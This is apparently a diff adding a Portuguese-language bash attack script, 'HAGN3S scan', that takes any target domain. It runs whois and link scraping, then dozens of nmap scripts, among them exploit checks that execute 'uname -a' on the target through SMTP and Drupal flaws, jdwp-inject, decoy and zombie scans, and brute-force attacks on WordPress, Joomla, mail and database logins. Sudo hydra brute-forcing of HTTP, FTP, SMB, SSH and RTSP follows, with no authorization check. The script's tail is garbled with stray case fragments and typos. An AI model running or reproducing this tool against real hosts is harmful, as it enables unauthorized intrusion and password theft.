@@ -1,0 +1,292 @@
+#!/bin/bash
+notify-send ["This is my contact application wickr address overthwows"] "<body>"
+notify-send --hint=int:transient:1 -u low -t 10000 "FECHAR (X) IMAGEM PARA" "INICIAR SCRIPT"
+sleep 5
+notify-send --hint=int:transient:1 -u low -t 10000 "FECHAR (X) IMAGEM PARA" "INICIAR SCRIPT"
+screen display contato.png
+export PS1='\[\033[0;35m\]\h\[\033[0;33m\] \w\[\033[00m\]: '
+#erro logs
+rm logs.html 2> /dev/null
+rm log.txt 2> /dev/null
+rm myscan 2> /dev/null
+rm vfast.txt 2> /dev/null
+sleep 2
+tput setf 4
+clear
+echo "                                                                                "
+echo "                                     |\|       "
+echo "                                     |||                                                                                     ==============        "
+echo "                                     |||                                                                                    === R_skabello ===     "
+echo "                                     |||                                    " 
+echo "                              -------|||---------                                                "
+echo "                             EXTERNAL PORTS SCAN|              " 
+echo "                            ---------|||----------                                        "
+echo "                                  ~-[{o}]-~                                     "
+echo "                                     |/|                                           "
+echo "              ___                    |/|                                        "
+echo "             ///~    |\\_              0         =\\\\         . .              "
+echo "              |=  ))\_| ~-_           0        _)  \      _/_/|              "
+echo "           /  ((((((    ~ \                  ~~~\-~-_ /~ (_/\               "
+echo "         / /)))))))\_          == HAGN3S==   \_  /  D   |             "
+echo "        (       (((((( ~-/ ~-/    |SCAN|          ~-;  /    \--_             "
+echo "         ~~--|   ))   ')  `                   `~~\_    \   )          "
+echo "             :        (_  ~\           ,         /~~-     ./     |     "
+echo "              \        \_   )--__  /(_/)        |    )    )|     |    "
+echo "    ___       |_     \__/~-__    ~~   ,'      /,_;,   __--(   _/      |         "
+echo "  //~~\\ \_(_     _-~~-\                  ~~ ~~~~~~   \_      /            "
+echo " )))     ~----'   /      \                            )       )           "
+echo "  (         ;~--        :                            _-    ,;;(             "
+echo "            |    \       |                         _-~    ,;;;;)            "
+echo "            |    /\     ;                          _-~          _/             "
+echo "           /~   /    |    )       $(whoami)         /;;;''  ,;;:-~                "
+echo "          |    /     / | /                         |;;'   ,''                   "
+echo "          /   /     |  \\|                         |   ,;(            "
+echo "        _/  /       \  \_)                   .---__\_    \--._______          "
+echo "       ( )|         (~-_|                   (;;  ;;;~~~/ ;;|  ;;;\        "
+echo "        ) \_         |-_;;--__               ~~~----__/    /_______/         "
+echo "   "
+while true
+do                                                                                                                          
+tput setf 1
+echo ""
+tput setf 2                                                                        
+# exploit criates
+# remove hidra backups
+arquivo="hydra.restore"
+if [ -f "$arquivo" ]
+then
+rm hydra.restore
+echo "Ok"
+else
+echo "  "
+fi
+#inicio whois check
+echo "Digite target ex: site.com.br"                                                                                                                                                  
+      read nome                                                                                                                                                        
+echo -e "Reading whois \e[00;33mdatabase\e[00m"
+arquivo="logs.html"
+if [ -f "$arquivo" ]
+then
+echo ""
+rm logs.html log.txt myscan
+else
+echo""
+fi
+sleep 2
+whois $nome
+sleep 1
+#scan social midia
+echo " "
+echo -e "\e[01;34mSOCIAL MEDIA LINKS\e[00m"
+echo " "
+echo "Searching social links in the Website"
+#scan show html check malware
+wget --no-check-certificate -qO- $nome > logs.html
+cat logs.html | egrep -o "(http|https):.*\">" | awk 'BEGIN {FS="\""};{print $1}' > log.txt
+echo "------------------------------------------"
+echo " " 
+sleep 2  
+echo -e "\e[00;41mSOCIAL LINKS\e[00m..."
+echo " "
+cat log.txt | grep --color -E twitter
+echo " "
+cat log.txt | grep --color -E plus.google.com
+echo " "
+cat log.txt | grep --color -E facebook
+echo " "
+cat log.txt | grep --color -E linkedin
+echo " "
+cat log.txt | grep --color -E pinterest
+echo " "
+cat log.txt | grep --color -E instagram
+echo " "
+cat log.txt | grep --color -E youtube
+echo " "
+cat log.txt | grep --color -E soundcloud
+echo " "
+cat log.txt | grep --color -E flickr
+echo " "
+sleep 2
+tput setf 6
+echo -e "\e[00;41mCheck >> MINÉRIO BITCOIN ONLINE SITE  ===========||||>  coinhive.com   <|||\e[00m..."
+sleep 4
+echo ".                                                                                            ."
+echo "  .                                                                                         . "
+echo "     .                                                                                    ."
+echo "        .      .       .       .      .      .     .     .      .     .     .    ."
+arquivo="logs.html"
+if [ -f "$arquivo" ]
+then
+grep "https://coinhive.com/lib/coinhive.min.js" logs.html
+else
+echo "  "
+fi
+# check open ports
+sleep 3
+echo -e "\e[00;41mCriando  logs\e[00m..."
+echo -e "\e[00;41m======================== Logs seŕão removidos ao reiniciar o SCRIPT\e[00m..."
+read -sn 1 -p "Press qualquer tecla e continue   ==>   Ctrl+C  interromper processo ....."
+tput setf 4
+# inicial brute ports logs output
+nmap -oX myscan www.$nome
+nmap -sA -O -v www.$nome
+nmap -v -sC -sV -sS www.$nome                                                                                                                                              
+nmap -p 80 --script dns-brute.nse $nome 
+nmap --traceroute --script traceroute-geolocation.nse -p 80 $nome 
+#test
+# -localize
+nmap -script ip-geolocation-geoplugin $nome
+# check users
+nmap -p80 --script http-userdir-enum $nome 
+#check firewal
+nmap -p80 --script http-waf-detect --script-args="http-waf-detect.uri=/testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges" www.$nome
+#web comuns
+nmap --script http-enum -p80 $nome 
+nmap -p 443 --script ssl-ccs-injection $nome 
+nmap -p49152 --script supermicro-ipmi-conf $nome 
+nmap -p 12345 --script netbus-auth-bypass $nome 
+nmap $nome -p 7547 --script=http-vuln-misfortune-cookie 
+nmap -p80 --script http-dombased-xss.nse $nome 
+nmap --script=http-phpself-xss -p80 $nome
+nmap -sV --script http-self-xss $nome
+nmap --script=firewalk --traceroute --script-args=firewalk.probe-timeout=400ms www.$nome 
+nmap -sT $nome -p 80 --script=+jdwp-inject --script-args filename=HelloWorld.class www.$nome 
+nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 www.$nome
+nmap -p80 --script http-stored-xss.nse $nome 
+nmap -sV -O -v www.$nome 
+notify-send [  "terminalclub.github.io"  ] "<body>" 
+nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 www.$nome 
+nmap --script http-brute -p 80 www.$nome 
+nmap --script http-brute -p 8080 www.$nome 
+nmap -sI Zombie -Pn -p20-25,110 -r --packet-trace -v www.$nome
+nmap -sI Zombie:113 -Pn -p20-80,110-180 -r –packet-trace -v www.$nome
+nmap --script http-brute -p 8443 www.$nome 
+nmap -sn --script ms-sql-empty-password --script-args mssql.instance-all www.$nome 
+nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/opt/hagn3scan/wlist/all.txt www.$nome 
+nmap -sV --script=http-sql-injection www.$nome
+nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL www.$nome 
+nmap -p80 –script=http-email-harvest www.$nome 
+nmap --script=http-email-harvest www.$nome
+nmap -p110 --script pop3-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt www.$nome 
+nmap -p25 --script smtp-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt www.$nome 
+nmap -p143 --script imap-brute --script-args userdb=/opt/hagn3scan/wlist/all.tx,passdb=/opt/hagn3scan/wlist/wordlist.txt www.$nome 
+nmap -p80 --script http-google-email --script-args http-google-email.pages=10 www.$nome 
+nmap -sU --script dns-fuzz --script-args timelimit=2h www.$nome 
+nmap -p 445 www.$nome --script=smb-double-pulsar-backdoor 
+nmap --script=http-phpself-xss -p80 www.$nome 
+ nmap -p8728 --script mikrotik-routeros-brute www.$nome
+#zombies
+nmap -Pn -p -sI $nome 192.168.10
+nmap -Pn -p -sI $nome 192.168.1.9
+nmap -Pn -p -sI $nome 192.168.1.8
+nmap -Pn -p -sI $nome 192.168.1.1
+#min script version
+nmap -sV -sC www.$nome 
+nmap -sU -p 6481 --script=servicetags www.$nome 
+nmap -v -p 80 --script http-enum www.$nome 
+nmap -v -p 8080 --script http-enum www.$nome 
+nmap -v -p 8443 --script http-enum www.$nome 
+nmap -sV --script http-wordpress-users --script-args limit=50 www.$nome 
+nmap -v -p 80 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 8080 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome
+nmap -v -p 8443 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 80 --script http-joomla-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 8080 --script http-joomla-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 8443 --script http-joomla-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome
+nmap -p 80--script http-bigip-cookie www.$nome
+nmap -sS $nome -D 10.0.0.1,10.0.0.2,10.0.0.4
+nmap -sU -p 7329 --script tenda-backdoor www.$nome
+nmap -sP -PA $nome
+nmap -sS -P0 $nome
+nmap -V $nome
+nmap -sU $nome
+nmap -sU --reason $nome
+#out min script
+nmap --script=cics-user-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,cics-user-brute.commands="exit;logon applid(cics42)" -p 23 www.$nome 
+nmap -sV --script http-wordpress-brute --script-args '/opt/hagn3scan/wlist/wordlist.txt,passdb=/opt/hagn3scan/wlist/all.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' www.$nome 
+nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $nome 
+nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $nome 
+nmap --script http-passwd --script-args http-passwd.root=/admin/ $nome 
+nmap -p 8332 --script bitcoinrpc-info --script-args creds.global=/opt/hagn3scan/wlist/all.txt:/opt/hagn3scan/wlist/wordlist.txt www.$nome 
+nmap -sV --script mysql-users www.$nome 
+nmap --script rtsp-url-brute -p 554 $nome
+#nmap -p 554 --script rtsp-methods $nome
+#nmap -p 554 --script rtsp-url-brute $nome
+nmap --script=mysql-brute www.$nome 
+nmap --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' www.$nome 
+nmap --script vnc-brute -p 5900 www.$nome 
+nmap -sV --script=pop3-brute www.$nome 
+nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 www.$nome 
+nmap --script http-vmware-path-vuln -p80,443,8222,8333 www.$nome 
+#veryfast
+nmap -F $nome/24 >> vfast.txt
+# create relator
+sleep 2
+echo -e "\e[00;41m==================================  RELATÓRIOS =====================================================\e[00m..."
+cat myscan
+echo " relator 1"
+sleep 8
+cat vfast.txt
+echo " relator 2"
+sleep 8
+echo -e "\e[00;41m=================FASE 2 TENTATIVA USO BRUTE-FORCE <==> PORTS SCANs\e[00m..."
+#mensagem
+sleep 3
+notify-send ["Edite worlist .. diretório wlist crie e copie sua worlist e renomeie. com mesmo nome"] "<body>"
+notify-send ["ex: userfull   passfull"] "<body>"
+sleep 5
+echo -e "\e[00;43====================================================================================================\e[00m..."
+echo -e "\e[00;42m====================  | HYDRA-ATACK | ============================================|  BRUTE   |\e[00m..."
+echo -e "\e[00;40m ====================|    PORTS     | ============================================|  FORCE   |========\e[00m..."
+read -sn 1 -p "Press qualquer tecla e continue <====|====> Ctrl+C  interromper processo ....."
+while true; do tput sc; tput cup 0 $(($(tput cols)-74)); w | grep load; tput rc; sleep 10; done &
+sleep 2         
+sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt http://$nome
+sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt ftp://$nome 
+sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt smb://$nome
+sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt ssh://$nome
+sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt rtsp://$nome
+sleep 4
+echo " heavy raw phase 2    @ 2 tentativas BRUTE-FORÇA scanner complexo"
+sleep 3
+read -sn 1 -p "Press qualquer tecla e continue   ==>   Ctrl+C  interromper processo ....."
+sleep 1
+sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt http://$nome
+sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt ftp://$nome
+sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt smb://$nome
+sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt ssh://$nome
+sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt rstp://$nome
+tput setf 5
+echo " Executar outro atack? (s/n)"
+read CONFIRMA
+clear
+case $CONFIRMA in 
+    "n")
+break;
+esac
+done
+clear
+tput setf 9
+exit
+exit
+ #...
+ # ...
+    
+
+   "s")
+
+"echo""
+
+# ...
+# ...           
+    ;;
+
+    *)
+        echo  "Opção inválida."
+    ;;
+esac		
+	done			
+
+
+
+
